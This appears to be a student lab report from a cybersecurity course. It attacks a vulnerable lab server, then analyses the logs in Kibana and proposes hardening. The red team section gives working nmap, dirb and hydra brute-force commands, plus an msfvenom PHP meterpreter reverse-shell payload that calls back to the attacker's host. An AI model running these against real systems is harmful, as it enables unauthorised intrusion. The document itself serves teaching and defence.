## Project 2:
## Red Team vs Blue Team

## Assessment, Analysis, and Hardening of a Vulnerable System


### Contents

1.Network Topology

2.Red Team

3.Blue Team

4.Hardening







### 1. Network Topology

![draw.io](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/NetworkDiagram.jpg)

| Hostname | IP Address    | Role on Network |
|----------|---------------|-----------------|
| Hyper-V  | 192.168.1.1   | Gateway         |
| Kali     | 192.168.1.90  | Attacker        |
| Capstone | 192.168.1.105 | Victim          |
| Elk      | 192.168.1.100 | Elk Stack       |
### 2. Red Team: Security Assesment

I based the assement off of the [2021 OWASP Top 10 Web Application Security Risks](https://owasp.org/www-project-top-ten/) 

| Rank | OWASP    |       Vulnerability       |                                                          Description                                                         |                                                  Impact                                                 |
|:----:|----------|:-------------------------:|:----------------------------------------------------------------------------------------------------------------------------:|:-------------------------------------------------------------------------------------------------------:|
|   1  | A05:2021 | Security Misconfiguration |     Nothing to stop a port scan, nothing to stop a brute force attack and directions for system access accessible on server    |            This was foundational to the entire attack, and  allowed for privledge escalation.           |
|   2  | A02:2021 |   Cryptographic Failures  | Storing a password in a hash that was able to be cracked,  and leaving directions for further infiltration  into the system. | The passwords were easily cracked, and the directions to access sensitive information were accessible.  |
|   3  | A04:2021 |      Insecure Design      |                Storing sensitive information online and allowing remote upload to the server from any system.                |      This allowed the hack to escalate to root privileges on the host server. Complete compromise.      |		
		



#### Exploitation: 1 Security Misconfiguration

	1. Tools and Processes
		- Nmap
		- Dirb
		- Hydra
		- Storing Secret credentials online
	2. Acheivments
		- Map the Network, and server
		- Discover hidden directories
		- Crack a password
	3. Screenshots and Command
		
		- `nmap -sV 192.168.1.105`
  
![nmap ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/1nmap.png)

		- `dirb 192.168.1.105`
  
![dirb ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/2.dirb.png)

		- `hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder` 
  
![Hydra Input ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/3.hydra(input).png)

![Hydra Output ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/4.hydra(output).png)

#### Exploitation: 2 Cryptographic Failures

	1. Tools and Processes
		-Network Exploration
		-Reconnaisance
		-Hydra
		-Crackstation
	2. Acheivments
		- This gave me full access to the entire server, including the hidden directories and files.

	3. Screenshots and Command
   	
	   - Prompts of a "secret_folder" with the network location included
  
![secretfolder prompt ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/5.SecretFolderPrompt.png)

		- Login screen at the secret folder location.
			- This shows a potential username that I successfully used in the brute force attack with Hydra.  
  
![secretfoldernotice](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/6.secretfoldernotice.png)

		- Once inside the secret folder I found a Hashed password and the user credentials to use with it. 
    		- It also contains directions of where to use the credentials and what can be accessed. 
  
![hashed pass ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/7.HashedPass.png)

		- Cracking the hash I found with crackstation
-  [Crackstation](https://crackstation.net)
  
![crackstation work ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/8.Crackstation.png)

#### Exploitation: 3 Insecure Design

	1. Tools and Processes
		- Port Scanning
		- Brute Forceable
		- Remote Code Execution
		- msfvenom
		- Reverse Shell
		- msfconsole
		- Meterpreter
	2. Acheivments
		- This allowed me to do everything that I did: 
    		- mapping the network 
    		- cracking the passwords  
    		- escalating privledges until I was in a shell and located at the root directory of the companies server. 
	
	3. Screenshots and Command


		- Remote access to the server with the cracked credentials
  
![WebDAV Login ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/9.WebDAV(login).png)

![WebDAV access ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/10WebDav(access).png)

		- Creating a reverse shell with msfvenom to remotely execute

`msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 >>~/Desktop/shell.php`
  
![msfvenom reverse shell script creation](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/11.msfVenom.png)

		- Click the shell and drag it into the directory.

![upload reverse shell script ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/12.UploadShell.png)

		- Set up a remote computer to listen for the shell to be executed
  
![msfconsole start ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/13.msfconsole(start).png)

![msfconsole setup ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/14.msfconsolesetup.png)

		- Remote execution of the shell with a hacker waiting on the other side by clicking "shell.php" from within the WebDAV directory
  
![risky click shell ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/15.RiskyClickReverseShell.png)

		-Meterpreter session was initiated with that last click

![hackerscomp Meterpreter Connection](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/16.MeterpreterSession.png)

		- The hacker can easily do anything they want with the server at that point

![progression of the shell ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/17.Progressionofshell.png)




### 3. Blue Team: Log Analysis and Attack Characterization

#### Analysis: Identifying the Port Scan
	
	1.What time did the Port scan occur?
		On May 13th 2022 between 3:00am and 3:30am
		It appears there were 2 port scans before the attack.
			One at approximately 3:05am
			One at approximately 3:15am
		
		`NOT source.port: 80 and NOT source.port:443`

![source port](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/18.SourcePort.png)
	
	It appears the vast majority of packets were from the IP address 192.168.1.90 (Kali)

![portscan IP](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/portscanip.png)

	2.How many packets were sent, and from which IP?
		3:05: 30,716 packets were received
		3:15: 32,430 packets were received
		From IP Address 192.168.1.90

	3.What Indicates that this was a port scan?
		- The unusual amount of irregular ports being used 
		- The size of the packets each port received and 
		- The timing between the requests tell me it was an automated scan of the network. 
	4.Kibana SS's depicting the scan
	
	Packets involving ports not used for web traffic
![sourceport](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/19.Sourceport2.png)



	3:05 source ports excluding standard web traffic (top) 3:05 Destination ports excluding standard web traffic (bottom)
	
![305 Ports in use1](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/20.305portsinuse1.png)

	A bar graph depicting the destination ports at 3:05

![305 Ports in use2](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/21.305Portsinuse2.png)
	
	3:15 source ports excluding standard web traffic (top) 3:15 Destination ports excluding standard web traffic (bottom)

![315 Ports in use1](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/22.315portsinuse1.png)
	
	A bar graph depicting the destination ports at 3:15

![315 Ports in use2](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/23.315portsinuse2.png)

	A bar graph of the destination ports being used during the attack at 3:27

![327 Ports in use1](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/24.327portsinuse1.png)

	Total Packets during the attack at 3:27

![327 Ports in use2](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/25.327portsinuse2.png)

#### Analysis: Finding the Request for the Hidden Directory
	1.What time did the request occur?
		-May 13, 2022 @ 03:25:41.765
	2.How many requests were made?
		-16,608
	3.Which Files were requested?
		-"connect_to_corp_server"
	4.What did they contain?
		- the volume of requests from an individual source in such a short period of time show that this was a brute force attack against the hidden directory by a single attacker
	5.Kibana SS's depicting request for the Hidden Directory

![countHiddenDirReq](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/26.CountHiddenDir.png)

	- This shows the volume of requests from a singular IP address for the secret folder
  	
![TimeHiddenDirReq](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/27.TimeHiddenDirReq.png)

![countandtime](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/28.ContnTimeHiddenDirReq.png)

#### Analysis: Uncovering the Brute Force Attack
	1.How many requests were made in the attack?
		- 16,608
	2.How many requests had been made before the attacker discovered the password?
		- 16,606
	3.Kibana SS's depicting the brute force attack
		-Connections over time

![bruteforce1(29)](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/29.bruteforce1.png)
Requesting 

`url.path: "/company_folders/secret_folder"`

Top is searching for the requests

Bottom shows how many request returned with an "OK" status

![uncoverbrute](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/uncvoerbrute.png)


#### Analysis: Finding the WebDAV Connection
	1.How many requests were made to this directory?
		- 37 were made to the wWebDAV folder
	2.Which Files were requested?
		- the reverse shell "shell.php" was requested 20 times
	3.Kibana SS's depicting the WebDAV connection

	This image shows the connections to the WebDAV directory, and the status codes that were sent.

![WebDav Directory31](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/31.WebDavDirectory%20Requests.png)

	This image shows the reverse shell file that was uploaded and utilized.

![requested fileShell.php32](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/32.WebDAVRequestedFile.png)


### 4. Hardening: Proposed Alarms and Mitigation Strategies

	
	Mitigation: Blocking the Port Scan
		1.Alarm
			-What kid of alarm can be set to detect future port scans?
				Any port not whitelisted receiving data 
			-What threshold would you  set to activate this alarm?
				If an Individual IP requests more than 5 ports in 5 seconds
		2.System Hardening
			-What configurations can be set on the host to mitigate port scans?
				any IP addresses attempting to scan the ports will be dropped and blacklisted.
			-Describe the solution.
				This will stop a potential attacker from mapping out the network and figuring out ways to exploit it. 

	Mitigation:Finding the Request for the Hidden Directory
		1.Alarm
			-What kind of alarm can be set to detect future unauthorized access?
				Authorize select IP Addresses
				Trigger an alarm if an unauthorized IP attempts access
			-What threshold would you set to activate?
				Any IP not authorized would set off the alarm. 
		2.System Hardening
			-What configuration can be set on the host to block unwanted access
				Any IP address that is not whitelisted for access to the Hidden Directory will be dropped and blacklisted.
			-Describe the solution.
				This will mean that any computer that is not authorized access will be IP banned from the server and the directory. 
			
	Mitigation: Preventing Brute Force Attacks
		1.Alarm
			-What kind of alarm can be set to detect future brute force attacks?
				-# of failed logins per minute
			-What threshold would you set to activate this alarm?
				-5 failed logins in a minute before a account freeze for 30 minutes
		2.System Hardening
			-What configuration can be set on the host to block brute force attacks?
				-A lock on failed login attempts 
				-add a captcha to the login screen
			-Describe the solution.
				- this will prevent a brute force login attempts from occuring, by throttling possible login attempts. 

	Mitigation: Detecting the WebDAV Connection
		1.Alarm
			-What kind of alarm can be set to detect future access to this directory?
				Any attempted access of the connection that is not from a system authorized for the connection
			-What threshold would you set to activate this alarm?
				1
		2.System Hardening
			-What configuration can be set on the host to conrol access?
				Only allow access from a specific location or system.
			-Describe the solution.
				This is an access control that would only allow a predesignated system to modify the contents of the server. 
	
	Mitigation:  Identifying Reverese Shell Uploads
		1.Alarm
			-What kind of alarm can be set to detect future file uploads?
				An alarm could be set for post requests on the server from unauthorized systems
			-What threshold would you set to activate this alarm?
				Any unauthorized system that is uploading to the server should set off an alarm. 
		2.System Hardening
			-What configuration can be set on the host to block file uploads?
				-Ony allow  authorized systems to upload files
			-Describe the solution.
				-this would make it so that there is only one possible system to upload files 
